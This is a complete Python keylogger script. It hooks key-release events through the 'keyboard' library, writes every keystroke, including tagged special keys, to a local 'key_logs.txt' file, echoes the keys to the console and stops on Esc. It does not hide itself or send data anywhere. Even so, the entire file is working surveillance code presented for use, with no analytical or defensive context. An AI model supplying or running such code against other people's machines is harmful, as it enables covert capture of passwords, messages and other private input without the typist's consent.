import keyboard

# File to store keystrokes
file_name = "key_logs.txt"  

# Function to save keys to file
def save_keys(key):
    with open(file_name, "a", encoding="utf-8") as file:
        file.write(key)

# Function to handle key events
def key_handler(event):
    key = event.name

    # Handling special keys
    if key == "space":
        key = " "
    elif key == "enter":
        key = "\n"
    elif key == "decimal":
        key = "."
    elif len(key) > 1:
        key = f"<{key}>"

    save_keys(key)
    print(key, end='', flush=True)  # Print keys in real-time

# Function to start keylogger
def start_logger():
    print("Keylogger is running... Press 'Esc' to stop.")
    keyboard.on_release(key_handler)
    keyboard.wait("esc")
    print("\nKeylogger stopped.")

if __name__ == "__main__":
    start_logger()
